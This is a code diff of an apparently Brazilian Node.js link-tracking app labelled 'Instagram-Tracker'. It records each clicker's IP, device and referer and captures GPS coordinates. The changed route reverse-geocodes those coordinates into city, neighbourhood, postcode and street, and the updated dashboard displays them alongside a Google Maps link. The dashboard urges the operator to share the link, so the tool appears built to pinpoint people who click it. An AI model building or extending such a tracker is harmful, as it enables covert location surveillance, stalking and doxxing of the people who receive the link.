@@ -100,31 +100,64 @@ app.get('/', (req, res) => {
         <div id="stats" class="stats"></div>
         <div id="clicks" class="clicks-container"></div>
       </div>
-      <script>
+<script>
         async function loadData() {
           const res = await fetch('/api/stats');
           const data = await res.json();
           
           document.getElementById('stats').innerHTML = \`
-            <div class="stat-card"><h3>\${data.totalClicks}</h3><p>Total</p></div>
+            <div class="stat-card"><h3>\${data.totalClicks}</h3><p>Total de Cliques</p></div>
             <div class="stat-card"><h3>\${data.clicksComGPS || 0}</h3><p>Com GPS</p></div>
+            <div class="stat-card"><h3>\${data.totalClicks - (data.clicksComGPS || 0)}</h3><p>Sem GPS</p></div>
           \`;
 
-          const clicksHtml = data.clicks.map(c => \`
-            <div class="click-card \${c.gps ? 'with-gps' : 'no-gps'}">
-              <p>⏰ \${new Date(c.timestamp).toLocaleString('pt-BR')}</p>
-              <p>🌐 IP: \${c.ip}</p>
-              <p>📱 \${c.device}</p>
-              \${c.gps ? \`
-                <p>📍 GPS: \${c.gps.lat}, \${c.gps.lng}</p>
-                <a href="https://www.google.com/maps?q=\${c.gps.lat},\${c.gps.lng}" 
-                   target="_blank" class="maps-link">📍 Ver no Google Maps</a>
-              \` : '<p>⚠️ Sem GPS</p>'}
-            </div>
-          \`).join('');
+          const clicksHtml = data.clicks.map(c => {
+            const hasGPS = c.gps && c.gps.lat;
+            const loc = c.location;
+            
+            return \`
+              <div class="click-card \${hasGPS ? 'with-gps' : 'no-gps'}">
+                <div style="display: grid; gap: 0.8rem;">
+                  <div><strong>⏰ Data/Hora:</strong> \${new Date(c.timestamp).toLocaleString('pt-BR')}</div>
+                  <div><strong>🌐 IP:</strong> \${c.ip}</div>
+                  <div><strong>📱 Dispositivo:</strong> \${c.device}</div>
+                  
+                  \${hasGPS ? \`
+                    <div style="margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #10b981;">
+                      <div style="color: #10b981; font-weight: 600; margin-bottom: 0.8rem;">
+                        📍 LOCALIZAÇÃO GPS EXATA
+                      </div>
+                      \${loc ? \`
+                        <div><strong>🏙️ Cidade:</strong> \${loc.cidade}, \${loc.estado}, \${loc.pais}</div>
+                        <div><strong>🏘️ Bairro:</strong> \${loc.bairro}</div>
+                        <div><strong>📮 CEP:</strong> \${loc.cep}</div>
+                        <div><strong>🗺️ Coordenadas:</strong> \${c.gps.lat}, \${c.gps.lng}</div>
+                      \` : \`
+                        <div><strong>🗺️ Coordenadas:</strong> \${c.gps.lat}, \${c.gps.lng}</div>
+                      \`}
+                      <a href="https://www.google.com/maps?q=\${c.gps.lat},\${c.gps.lng}" 
+                         target="_blank" class="maps-link">
+                        📍 Ver no Google Maps
+                      </a>
+                    </div>
+                  \` : \`
+                    <div style="color: #ef4444; font-weight: 600; margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #ef4444;">
+                      ⚠️ GPS não autorizado (localização por IP imprecisa)
+                    </div>
+                  \`}
+                  
+                  <div style="margin-top: 0.5rem; font-size: 0.85rem; color: #666;">
+                    <strong>🔗 Origem:</strong> \${c.referer}
+                  </div>
+                </div>
+              </div>
+            \`;
+          }).join('');
           
-          document.getElementById('clicks').innerHTML = clicksHtml || '<p>Nenhum clique ainda</p>';
+          document.getElementById('clicks').innerHTML = clicksHtml || 
+            '<div style="background: white; padding: 3rem; border-radius: 15px; text-align: center;">Nenhum clique rastreado ainda. Compartilhe seu link!</div>';
         }
+        
         loadData();
         setInterval(loadData, 10000);
       </script>
@@ -221,22 +254,66 @@ app.get('/track', (req, res) => {
 });
 
 // ROTA 3: Salvar GPS
-app.post('/api/save-gps', (req, res) => {
-  const gps = req.body;
-  gpsData.push(gps);
-  
-  const click = clicks.find(c => c.id === gps.clickId);
-  if (click) {
-    click.gps = {
-      lat: gps.latitude,
-      lng: gps.longitude,
-      accuracy: gps.accuracy
-    };
-    console.log(`📍 GPS: ${gps.latitude}, ${gps.longitude}`);
-    console.log(`🗺️ https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
+app.post('/api/save-gps', async (req, res) => {
+  try {
+    const gps = req.body;
+    gpsData.push(gps);
+    
+    const click = clicks.find(c => c.id === gps.clickId);
+    if (click) {
+      click.gps = {
+        lat: gps.latitude,
+        lng: gps.longitude,
+        accuracy: gps.accuracy
+      };
+      
+      // Busca informações de endereço
+      try {
+        const response = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${gps.latitude}&lon=${gps.longitude}&zoom=18&addressdetails=1`,
+          {
+            headers: {
+              'User-Agent': 'Instagram-Tracker/1.0'
+            }
+          }
+        );
+        
+        const locationData = await response.json();
+        
+        if (locationData && locationData.address) {
+          const addr = locationData.address;
+          
+          click.location = {
+            cidade: addr.city || addr.town || addr.village || addr.municipality || 'N/A',
+            estado: addr.state || 'N/A',
+            pais: addr.country || 'Brasil',
+            bairro: addr.neighbourhood || addr.suburb || addr.quarter || 'N/A',
+            cep: addr.postcode || 'N/A',
+            rua: addr.road || 'N/A'
+          };
+          
+          console.log('\n' + '='.repeat(60));
+          console.log('📍 NOVO CLIQUE COM GPS');
+          console.log('='.repeat(60));
+          console.log(`⏰ ${new Date(click.timestamp).toLocaleString('pt-BR')}`);
+          console.log(`🌐 IP: ${click.ip}`);
+          console.log(`🏙️  Cidade: ${click.location.cidade}, ${click.location.estado}, ${click.location.pais}`);
+          console.log(`🏘️  Bairro: ${click.location.bairro}`);
+          console.log(`📮 CEP: ${click.location.cep}`);
+          console.log(`🗺️  Coordenadas: ${gps.latitude}, ${gps.longitude}`);
+          console.log(`📍 https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
+          console.log('='.repeat(60) + '\n');
+        }
+      } catch (geoError) {
+        console.error('Erro ao buscar endereço:', geoError.message);
+      }
+    }
+    
+    res.json({success: true});
+  } catch (error) {
+    console.error('Erro ao salvar GPS:', error);
+    res.status(500).json({success: false});
   }
-  
-  res.json({success: true});
 });
 
 // ROTA 4: API Stats
